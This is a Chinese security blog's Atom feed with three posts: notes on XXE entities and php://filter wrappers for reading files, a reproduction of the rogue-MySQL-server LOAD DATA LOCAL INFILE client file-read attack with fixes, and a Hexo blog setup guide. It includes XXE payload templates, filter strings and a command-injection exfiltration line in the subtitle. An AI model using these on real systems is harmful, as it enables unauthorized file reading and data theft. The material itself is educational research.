<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Breezy&#39;s Blog</title>
  
  <subtitle>$&gt; ping -c 1 `whoami`.u.com</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://a1ne.github.io/"/>
  <updated>2020-04-03T01:34:43.163Z</updated>
  <id>http://a1ne.github.io/</id>
  
  <author>
    <name>Breezy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>协议tips</title>
    <link href="http://a1ne.github.io/2020/04/02/%E5%8D%8F%E8%AE%AEtips/"/>
    <id>http://a1ne.github.io/2020/04/02/%E5%8D%8F%E8%AE%AEtips/</id>
    <published>2020-04-03T00:35:31.000Z</published>
    <updated>2020-04-03T01:34:43.163Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到的很多利用，无论是XXE、SSRF还是类似文件包含的任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE一般是解析XML的时候调用了外部实体，通过外部实体读取内容回显出来或者通过向外的请求将数据带外。<br>实体简单来说就是某种变量，通过dtd(文档类型定义)的定义去引用(dtd也能够定义element去规定整个xml标签的结构)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r[                  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; dtd</span><br><span class="line">&lt;!ELEMENT r ANY &gt;               &#x2F;&#x2F;接受任意元素</span><br><span class="line">&lt;!ENTITY s &quot;test&quot;&gt;              &#x2F;&#x2F;实体</span><br><span class="line">]&gt;</span><br><span class="line">&lt;username&gt;&amp;s;&lt;username&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>上述的请求在解析过程中会将<code>username</code>字段的值替换成上面定义的<code>test</code><br>实体分为内部和外部，外部实体用于是引用外部的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY s &quot;test&quot;&gt;       内部实体</span><br><span class="line">&lt;!ENTITY s SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;test.dtd&quot;&gt;   外部实体</span><br><span class="line"></span><br><span class="line">除了上述 外部实体的引入还可以使用公用dtd</span><br><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>除了外部和内部的区别，实体还分为通用实体和参数实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">通用实体</span><br><span class="line">通过&amp;xxx;引用的实体,DTD 中定义后在XML中引用</span><br><span class="line">&lt;!DOCTYPE r[&lt;!ENTITY s SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;public.dtd&quot;&gt;]&gt;</span><br><span class="line">&lt;username&gt;&amp;s;&lt;&#x2F;username&gt;</span><br><span class="line"></span><br><span class="line">参数实体</span><br><span class="line">通过%xxx;引用，只能在DTD中定义和使用，只有在外部dtd中参数实体定义才能引用其他实体</span><br><span class="line">&lt;!DOCTYPE r[</span><br><span class="line">&lt;!ENTITY % s SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;public.dtd&quot;&gt;</span><br><span class="line">%s;   -----&gt;引入外部dtd文件内容</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>通过外部实体的引入可以使得不用频繁更新当前xml结构，但是引入的时候没有做限制，就可能导致结合协议的任意文件读取或ssrf。<br>最简单的场景就是一个登陆框，用xml形式传递用户名和密码。在请求后会将用户名回显出来<br>这时候就能够利用通用外部实体调用file协议读取敏感文件，然后通过响应的回显将文件内容显示出来，其他的协议类似，http、gopher、dict等协议可以实现进一步内网探测和攻击。<br>协议的支持偷一张小圆圆师傅(k0rz3n)的图</p><p><img src="/images/Protocol/xxe_pro.png" alt="upload successful"><br>读文件时候文件特殊字符问题可以对应根据协议去绕过，最舒服的就是php伪协议，其他的java对应的jar协议能够实现文件的上传,或者phar协议RCE，但高版本的jdk移除了对gopher协议的支持，并且带外url中不支持<code>\n</code>，http协议和ftp协议(大部分版本)只能读取一行.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-encode&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D; 去除特殊标签&lt;?php exit();?&gt;特别好使</span><br><span class="line">里面的协议支持管道string.strip_tags|convert.base64-encode</span><br></pre></td></tr></table></figure><p>php在安装扩展后还支持如下协议(同样盗图)</p><p><img src="/images/protocol/extension.png" alt="extension"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">9102年Java里的XXE</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近遇到的很多利用，无论是XXE、SSRF还是类似文件包含的任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。&lt;/p&gt;
&lt;h2 id=&quot;XXE&quot;&gt;&lt;a href=&quot;#XXE&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Mysql任意读取客户端文件</title>
    <link href="http://a1ne.github.io/2020/03/31/Mysql%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"/>
    <id>http://a1ne.github.io/2020/03/31/Mysql%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/</id>
    <published>2020-04-01T00:04:00.000Z</published>
    <updated>2020-04-03T00:30:48.676Z</updated>
    
    <content type="html"><![CDATA[<p>一直都想填的一个坑，之前也想写文章记录一下，由于太忙了水了水就过去了，昨天又遇到了相关的情况，并且很多问题也是之前没有理解清楚的，特此记录一番。 // 刚好作为每天水文。</p><h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>标题为Mysql任意读取客户端文件，拆分一下，关键词为Mysql和客户端以及如何实现任意读取的问题。</p><p>Mysql会涉及到一个版本的问题，不同版本特性差异，比如<code>4.x</code>可能就没有记录数据库名、表名和列名的information_schema表，而高版本的还可能加入了<code>secure_file_priv</code>这种让你读写两难的设置。针对某些版本可能并没有任意读取的特性，而针对一些版本又可能默认设置为<code>OFF</code></p><p>客户端是因为Mysql为C/S模式的程序，直接通过<code>systemctl start mysql</code>启动的是服务端，开启后可以看到指定监听端口是开放状态，通过msyql客户端对其进行连接<code>mysql -u root -p -h 127.0.0.1 -P 3306</code>,从而操作服务端对数据进行<code>CRUD</code>(这里说的有点笼统，其实各种支持Mysql连接的语言，都有各自对应的客户端扩展)。</p><p>任意读取涉及到一个特殊的用法<code>load data</code>,从<a href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html" target="_blank" rel="noopener">官方文档</a>可以看出来该用法是为了高速读取文件数据并将其插入到数据表中，与<code>select data into outfile</code>相反。一般而言<code>load data</code>读取的文件是命令执行者本地的文件，比如客户端发起请求需要读取<code>/etc/passwd</code>,这时候读取到的就是服务端的<code>/etc/passwd</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA</span><br><span class="line">    [LOW_PRIORITY | CONCURRENT] [LOCAL]</span><br><span class="line">    INFILE &#39;file_name&#39;</span><br><span class="line">    [REPLACE | IGNORE]</span><br><span class="line">    INTO TABLE tbl_name</span><br><span class="line">    [PARTITION (partition_name [, partition_name] ...)]</span><br><span class="line">    [CHARACTER SET charset_name]</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#39;string&#39;]</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]</span><br><span class="line">        [ESCAPED BY &#39;char&#39;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#39;string&#39;]</span><br><span class="line">        [TERMINATED BY &#39;string&#39;]</span><br><span class="line">    ]</span><br><span class="line">    [IGNORE number &#123;LINES | ROWS&#125;]</span><br><span class="line">    [(col_name_or_user_var</span><br><span class="line">        [, col_name_or_user_var] ...)]</span><br><span class="line">    [SET col_name&#x3D;&#123;expr | DEFAULT&#125;,</span><br><span class="line">        [, col_name&#x3D;&#123;expr | DEFAULT&#125;] ...]</span><br></pre></td></tr></table></figure><p>在上述完整用法中能够看到<code>infile</code>参数,当参数被指定的时候会从客户端读取文件并发送到服务端</p><blockquote><p>If LOCAL is specified, the file is read by the client program on the client host and sent to the server. The file can be given as a full path name to specify its exact location. If given as a relative path name, the name is interpreted relative to the directory in which the client program was started.<br>When using LOCAL with LOAD DATA, a copy of the file is created in the directory where the MySQL server stores temporary files. See Section B.4.3.5, “Where MySQL Stores Temporary Files”. Lack of sufficient space for the copy in this directory can cause the LOAD DATA LOCAL statement to fail.</p></blockquote><p>因为平时都是直接使用客户端授权去连接服务端操作，默认环境是客户端可控，这个用法其实很正常，并且对于一些数据的备份转移很有帮助。</p><blockquote><p>load data local infile语法需要mysql版本在5.1以上<br>可以通过语句show variables like “%local%”; 查看是否开启  不支持可以在连接的时候加上–enable-local-infile</p></blockquote><h2 id="0x01-复现"><a href="#0x01-复现" class="headerlink" title="0x01 复现"></a>0x01 复现</h2><p>在实际情况中，很多网站为了方便远程管理并防止Mysql端口直接暴露，通常会使用一种类似PhpMyAdmin的管理工具作为客户端去管理服务器。如果支持外联，攻击者可以伪造数据库服务器提供连接，在其中执行上述语句对本地的文件(客户端文件)进行读取并插入到表中。</p><p>本地搭建adminer(版本需要在4.3.1到4.6.2间)进行复现<br><img src="/images/mysql_arbitrary_read/adminer.png" alt="adminer"><br>在mysql服务器上需要开启外连</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;mysql&#x2F;mariadb.conf.d&#x2F;50-server.cnf   修改bind-address 为0.0.0.0</span><br><span class="line">本地连接数据库</span><br><span class="line">use mysql;</span><br><span class="line">update user set host&#x3D;&quot;%&quot; where user&#x3D;&quot;root&quot;;</span><br><span class="line">service mysql restart </span><br><span class="line"></span><br><span class="line">新版的mysql认证方式默认为unix_socket，只允许默认的root用户从本地进行连接</span><br><span class="line">udpate user set plugin&#x3D;&quot;mysql_native_password&quot; where user&#x3D;&quot;root&quot;</span><br><span class="line">update user set authentication_string&#x3D;password(&#39;123456&#39;) where user&#x3D;&#39;root&#39;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>由于adminer是使用php的mysql客户端扩展进行连接，需要在<code>php.ini</code>中修改如下设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[MySQLi]</span><br><span class="line">mysqli.allow_local_infile &#x3D; On</span><br></pre></td></tr></table></figure><p>在adminer服务器和可控mysql服务器中分别朝<code>/etc/1</code>写入不同的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table test(content varchar(256));</span><br></pre></td></tr></table></figure><p><img src="/images/mysql_arbitrary_read/table.png" alt="table"><br>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;&#x2F;etc&#x2F;1&quot; into table test;</span><br><span class="line">select * form test;</span><br></pre></td></tr></table></figure><p><img src="/images/mysql_arbitrary_read/read.png" alt="read"><br>能够看到这里读取出来的内容是<code>web_server</code>也就是adminer web服务器写入的内容。</p><p>修改命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;1&quot; into table test;</span><br></pre></td></tr></table></figure><p><img src="/images/mysql_arbitrary_read/server.png" alt="server"><br>此时即是正常的读取文件的用法<br><strong>抓包</strong><br>第一步能够看到服务器向客户端发送自己的banner信息以及认证的方式</p><p><img src="/images/mysql_arbitrary_read/greet.png" alt="greet"></p><p>然后进行用户登录及初始化查询</p><p><img src="/images/mysql_arbitrary_read/init.png" alt="init"><br>客户端发起查询请求</p><p><img src="/images/mysql_arbitrary_read/select.png" alt="select"><br>服务端收到请求后会回复客户端请求的文件名</p><p><img src="/images/mysql_arbitrary_read/response.png" alt="response"><br>随后客户端会读取对应文件内容发送给服务端</p><p><img src="/images/mysql_arbitrary_read/send.png" alt="send"><br><strong>简化</strong><br>上述整体过程就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">客户端请求，服务端回复banner和登录信息</span><br><span class="line">客户端根据服务端回复发送登录数据,服务端校验响应</span><br><span class="line">客户端发起初始化查询(一个或多个，需要看基于的初始化环境，每次web端的查询都相当于与服务器交互一次)，服务端相应执行语句并返回结果</span><br><span class="line">客户端发送load data local infile 请求，服务端提取文件名回复文件读取请求</span><br><span class="line">客户端读取对应文件内容发送到服务端</span><br></pre></td></tr></table></figure><p>从官方文档中了解到，客户端是不会储存自身请求的，而是通过服务端的响应来执行操作，也就是无条件信任服务端，并且文件传送请求可以作为任意查询语句的响应</p><p><img src="/images/mysql_arbitrary_read/official.png" alt="officel"><br>因此上述过程可以改变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">客户端请求，服务端回复banner和登录要求</span><br><span class="line">客户端按照对应类型构造自身登录数据发送给服务端,服务端校验响应</span><br><span class="line">客户端发起初始化查询，服务端回复文件读取请求</span><br><span class="line">客户端读取对应文件内容发送到服务端</span><br></pre></td></tr></table></figure><p>整个过程在客户端主动的情况下均可控，因此可以编写一个恶意服务器监听实现文件读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loading</span><br></pre></td></tr></table></figure><h2 id="0x02-扩展"><a href="#0x02-扩展" class="headerlink" title="0x02 扩展"></a>0x02 扩展</h2><p>在有的时候文件内容存在特殊字符，读取过程中会出现空格截断或者读取不出的情况，一个解决思路是添加多个字段来存放空格分格后的内容，或者通过替换将特殊字符变成能够支持的字符，还有就是对文件内容进行编码。</p><p>如果是mysql客户端，最常见的用法就是hex编码，在上述语法中。明显不支持hex函数的加入，看似能够替换的<code>replace</code>关键字实际上是针对读取数据主键重复的处理。一般而言就需要采取多个字段自动分隔的手段。</p><p>鉴于上述是通过php的扩展实现，猜测读取文件可能是通过<code>file_get_contents()</code>之类的函数实现，而php是支持很多协议的<code>php,phar,zlib</code>等。可以通过各种协议的加入实现编码效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试过程第一步可以简单实用file协议读取，优先判断扩展是否支持协议</span><br></pre></td></tr></table></figure><p>这里直接使用伪协议进行读取<br><img src="/images/mysql_arbitrary_read/protocol.png" alt="protocol"><br>读取内容解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d2ViX3NlcnZlcgo&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;</span><br><span class="line">web_server</span><br></pre></td></tr></table></figure><p>其他的类型如下，均存在任意读取问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MySQL Client</span><br><span class="line">PHP + mysql&#x2F;mysqli</span><br><span class="line">PHP + PDO (MYSQL_ATTR_LOCAL_INFILE)</span><br><span class="line">Python + MySQLdb</span><br><span class="line">Python3 + mysqlclient</span><br><span class="line">Java + JDBC Driver</span><br></pre></td></tr></table></figure><p>至于利用方式则需要看不同语言环境的支持情况.而且攻防其实是可以相互转化的，在攻击者对你进行扫描的时候，某些条件下可以伪装mysql服务器向其发送精简的payload读取任意文件。</p><h2 id="0x03-修复"><a href="#0x03-修复" class="headerlink" title="0x03 修复"></a>0x03 修复</h2><p>最简单的就是在客户端禁用掉对应的用法，或者对服务端进行校验，如果只是为了管理本地数据库，可以禁止外连。</p><blockquote><p>参考<br>Read MySQL Client’s File [<a href="https://lightless.me/archives/read-mysql-client-file.html]" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html]</a><br>CSS-T | Mysql Client 任意文件读取攻击链拓展  [<a href="https://www.freebuf.com/vuls/225420.html]" target="_blank" rel="noopener">https://www.freebuf.com/vuls/225420.html]</a><br>Load data local infile packet format[<a href="https://dev.mysql.com/doc/internals/en/com-query-response.html]" target="_blank" rel="noopener">https://dev.mysql.com/doc/internals/en/com-query-response.html]</a><br>Greeting packet format [<a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake]" target="_blank" rel="noopener">https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake]</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一直都想填的一个坑，之前也想写文章记录一下，由于太忙了水了水就过去了，昨天又遇到了相关的情况，并且很多问题也是之前没有理解清楚的，特此记录一番。 // 刚好作为每天水文。&lt;/p&gt;
&lt;h2 id=&quot;0x00-原理&quot;&gt;&lt;a href=&quot;#0x00-原理&quot; class=&quot;head
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hexo 博客搭建</title>
    <link href="http://a1ne.github.io/2020/03/30/Hexo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://a1ne.github.io/2020/03/30/Hexo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</id>
    <published>2020-03-31T00:03:01.000Z</published>
    <updated>2020-03-31T00:50:44.278Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo-博客搭建过程记录"><a href="#Hexo-博客搭建过程记录" class="headerlink" title="Hexo 博客搭建过程记录"></a>Hexo 博客搭建过程记录</h1><blockquote><p>环境: github账号一枚(包括用户名同名reposity,如a1ne.github.io)、node、git bash</p></blockquote><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p>注册 ——&gt; 创建Reposity ——&gt;$(username).github.io</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接官网下载node安装包以及git安装包傻瓜安装(为了方便建议自定义路径)即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v </span><br><span class="line">npm -v </span><br><span class="line">git -v  安装了git后一般会添加注册表 右键能够看到git bash&#x2F;git gui</span><br></pre></td></tr></table></figure><h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><p>因为某些不可描述的原因，直接npm 或者git会显得很慢，可以适当配置一下代理或者安装淘宝的npm镜像源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;</span><br><span class="line">git config --global https.proxy &quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;</span><br><span class="line"></span><br><span class="line">git config --gloabl --unset http.proxy 即可取消</span><br><span class="line"></span><br><span class="line">同理</span><br><span class="line">npm config set proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">npm config set https-proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">npm config delete proxy</span><br><span class="line"></span><br><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">~初步建立</span><br><span class="line">mkdir&#x2F;md blog_directory</span><br><span class="line">hexo init</span><br><span class="line">npm install 安装依赖(可能不需要)</span><br><span class="line">hexo g  生成内容</span><br><span class="line">hexo s(erver) 本地监听查看</span><br><span class="line"></span><br><span class="line">访问即可看到搭建好的blog 至于字段内容需要自行在_config.yml中修改</span><br><span class="line"></span><br><span class="line">~安装主题</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next themes&#x2F;next</span><br><span class="line">修改_config.yml中Theme字段为next即可</span><br><span class="line"></span><br><span class="line">~安装插件</span><br><span class="line">$ npm install hexo-generator-feed</span><br><span class="line">$ npm install hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line">安装后再_config.yml中添加</span><br><span class="line">#Extensions</span><br><span class="line">plugins: hexo-generator-feed </span><br><span class="line">#- hexo-generator-sitemap </span><br><span class="line"></span><br><span class="line">feed:</span><br><span class="line">  type: atom ## atom&#x2F;rss2</span><br><span class="line">  path: atom.xml ##feed path</span><br><span class="line">  limit: 20  ##feed  minimum number of files</span><br><span class="line"></span><br><span class="line">$ npm install hexo-admin --save        编辑组件</span><br><span class="line">安装直接在本地监听启动后访问http:&#x2F;&#x2F;localhost:4000&#x2F;admin&#x2F; 即可</span><br><span class="line"></span><br><span class="line">~远程部署</span><br><span class="line">$ npm install hexo-deployer-git --save </span><br><span class="line">修改_config.yml中内容</span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line">deploy:</span><br><span class="line">   type: git &#x2F;&#x2F;高版本只能是git</span><br><span class="line">   repository: https:&#x2F;&#x2F;github.com&#x2F;A1ne&#x2F;a1ne.github.io.git    &#x2F;&#x2F;github中进入reposity 选择https方式可看到 </span><br><span class="line">   branch: master   </span><br><span class="line">   message: update </span><br><span class="line">   </span><br><span class="line">保存后</span><br><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy   会提示输入账号密码 如果为了方便也可以使用公私钥</span><br><span class="line"></span><br><span class="line">git bash中执行 ssh-keygen -t rsa -C &quot;email&quot;</span><br><span class="line">生成的id_rsa和id_rea.pub文件  将id_rsa.pub文件内容复制到github设置中的SSH and GPG key中即可</span><br><span class="line">ssh -T git@github.com  测试 </span><br><span class="line">当然在deploy配置中的repository需要修改成ssh类型链接</span><br><span class="line"></span><br><span class="line">~ 域名指定</span><br><span class="line">直接在blog source目录创建CNAME文件 写入映射的域名</span><br><span class="line">在域名提供后台管理DNS解析 创建CNAME记录指向$(username).github.io即可</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hexo-博客搭建过程记录&quot;&gt;&lt;a href=&quot;#Hexo-博客搭建过程记录&quot; class=&quot;headerlink&quot; title=&quot;Hexo 博客搭建过程记录&quot;&gt;&lt;/a&gt;Hexo 博客搭建过程记录&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;环境: github账号一
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
